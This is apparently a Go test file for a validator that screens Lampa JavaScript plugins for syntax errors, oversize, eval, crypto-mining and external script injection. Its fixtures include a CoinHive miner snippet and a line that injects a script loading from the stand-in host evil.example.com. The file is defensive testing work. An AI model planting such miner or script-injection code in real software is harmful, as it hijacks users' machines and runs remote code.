package httpapi

import (
	"strings"
	"testing"
)

func TestValidator_AcceptsValidPlugin(t *testing.T) {
	src := []byte(`
(function(){
  'use strict';
  Lampa.Plugins.add({name:'test', version:'1.0', start:function(){}});
  Lampa.Listener.follow('app',function(e){if(e.type==='ready')console.log('hi')});
})();
`)
	res := ValidatePluginSource("test.js", src)
	if !res.OK {
		t.Errorf("expected OK=true, got findings: %+v", res.Findings)
	}
	if !res.HasLampaAPI {
		t.Error("expected has_lampa_api=true")
	}
}

func TestValidator_RejectsSyntaxError(t *testing.T) {
	src := []byte(`function broken() { var x = ; }`)
	res := ValidatePluginSource("bad.js", src)
	if res.OK {
		t.Error("expected OK=false for syntax error")
	}
	found := false
	for _, f := range res.Findings {
		if f.Code == "syntax-error" {
			found = true
		}
	}
	if !found {
		t.Errorf("expected syntax-error finding, got %+v", res.Findings)
	}
}

func TestValidator_RejectsTooLarge(t *testing.T) {
	src := make([]byte, pluginMaxSizeBytes+10)
	for i := range src {
		src[i] = ' '
	}
	res := ValidatePluginSource("big.js", src)
	if res.OK {
		t.Error("expected OK=false for oversized")
	}
	if res.Findings[0].Code != "size-too-large" {
		t.Errorf("expected size-too-large, got %s", res.Findings[0].Code)
	}
}

func TestValidator_FlagsEval(t *testing.T) {
	src := []byte(`Lampa.Plugins.add({}); var r = eval(userInput);`)
	res := ValidatePluginSource("evil.js", src)
	if !res.OK {
		t.Errorf("eval should be warn, not fail. Findings: %+v", res.Findings)
	}
	found := false
	for _, f := range res.Findings {
		if f.Code == "use-of-eval" && f.Severity == "warn" {
			found = true
		}
	}
	if !found {
		t.Errorf("expected use-of-eval warning, got %+v", res.Findings)
	}
}

func TestValidator_RejectsMining(t *testing.T) {
	src := []byte(`Lampa.Plugins.add({}); var miner = new CoinHive.User('key'); miner.start(); var stratum = "mining.example.com";`)
	res := ValidatePluginSource("miner.js", src)
	if res.OK {
		t.Error("mining patterns should fail")
	}
}

func TestValidator_IgnoresCommentedKeywords(t *testing.T) {
	src := []byte(`
Lampa.Plugins.add({});
// avoid eval — don't use it!
/* mining is bad */
var x = 1;
`)
	res := ValidatePluginSource("clean.js", src)
	if !res.OK {
		t.Errorf("commented-out keywords should not fail, got %+v", res.Findings)
	}
	for _, f := range res.Findings {
		if f.Code == "use-of-eval" || f.Code == "mining-pattern" {
			t.Errorf("false positive on commented code: %s", f.Code)
		}
	}
}

func TestValidator_WarnsNoLampaAPI(t *testing.T) {
	src := []byte(`(function(){var x = 1; console.log('hi');})();`)
	res := ValidatePluginSource("util.js", src)
	if !res.OK {
		t.Error("no-lampa-api should be warn, not fail")
	}
	found := false
	for _, f := range res.Findings {
		if f.Code == "no-lampa-api" {
			found = true
		}
	}
	if !found {
		t.Errorf("expected no-lampa-api warning, got %+v", res.Findings)
	}
	if res.HasLampaAPI {
		t.Error("HasLampaAPI should be false")
	}
}

func TestValidator_FlagsExternalScriptInjection(t *testing.T) {
	src := []byte(`Lampa.Plugins.add({});
var s = '<script src="https://evil.example.com/x.js"></script>';
document.body.innerHTML += s;`)
	res := ValidatePluginSource("inject.js", src)
	codes := make([]string, 0)
	for _, f := range res.Findings {
		codes = append(codes, f.Code)
	}
	joined := strings.Join(codes, ",")
	if !strings.Contains(joined, "external-script-injection") {
		t.Errorf("expected external-script-injection, got %s", joined)
	}
}
